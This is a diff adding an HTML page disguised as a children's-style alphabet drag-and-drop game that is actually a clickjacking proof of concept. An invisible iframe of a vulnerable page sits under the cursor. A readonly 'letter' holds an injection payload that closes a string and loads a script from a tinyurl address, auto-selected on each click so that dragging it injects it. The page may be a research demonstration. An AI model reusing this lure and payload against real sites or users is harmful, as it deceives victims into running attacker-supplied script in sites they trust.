@@ -1,0 +1,108 @@
+<!doctype html>
+<html>
+<head>
+<script src="http://code.jquery.com/jquery-1.5.1.min.js"></script>
+<script>
+$(function() {
+
+  var selectAll = function() { 
+    $('#payload').get(0).select(); 
+  };
+
+  $('#payload').focus(selectAll);
+
+  $(document).mousedown(function() {
+    selectAll();
+    return true;
+  });
+});
+
+</script>
+<style>
+#victim {
+opacity: 0;
+}
+
+#victim {
+position: absolute;
+top: 210px;
+left: 135px;
+}
+
+#score {
+position: absolute;
+display: block;
+top: 210px;
+left: 360px;
+font-size: 12px;
+font-family: Verdana;
+}
+
+#payload {
+font-size: 30px;
+width: 25px;
+border: 0;
+font-family: Verdana, sans-serif;
+color: green;
+}
+
+#letters {
+font-size: 70px;
+font-family: Verdana, sans-serif;
+color: red;
+width: 70px;
+position: absolute;
+top: 0;
+left: 145px;
+}
+
+#letters2 {
+font-size: 70px;
+font-family: Verdana, sans-serif;
+color: red;
+width: 70px;
+position: absolute;
+top: -10px;
+left: 0px;
+}
+
+#letters3 {
+font-size: 70px;
+font-family: Verdana, sans-serif;
+color: red;
+width: 70px;
+position: absolute;
+top: 20px;
+left: 70px;
+}
+
+
+#handle {
+position: absolute;
+left: -200px;
+height: 95px;
+width: 79px;
+}
+
+#container {
+height: 400px;
+padding-top: 100px;
+margin-left: 200px;
+position: relative;
+}
+
+</style>
+</head>
+<body>
+<h1>Check your alphabet skills</h1>
+<p>Drag <span style="color:green">green</span> letter to corresponding lowercase <span style="color:red">red</span> letter on the right. For example: drag "P" to "p".
+The cursor will change to hint you that you're on the right track.</p>
+<div id=container><div id=letters2>h i n c</div><div id=letters>a d g x</div><div id=letters3>q p w e</div>
+<a id=score href="#" onclick="alert('0, try again!');return false;">check score</a>
+<div id=handle>
+<input id=payload readonly value='GOOG" // &lt;SCRIPT src="http://tinyurl.com/UPRCSONLYALRT"&gt;&lt;/script&gt;'>
+</div>
+<iframe id=victim src="vuln.html#find" width=500 height=20 border=0 scrolling=no></iframe>
+</div>
+</body>
+</html>
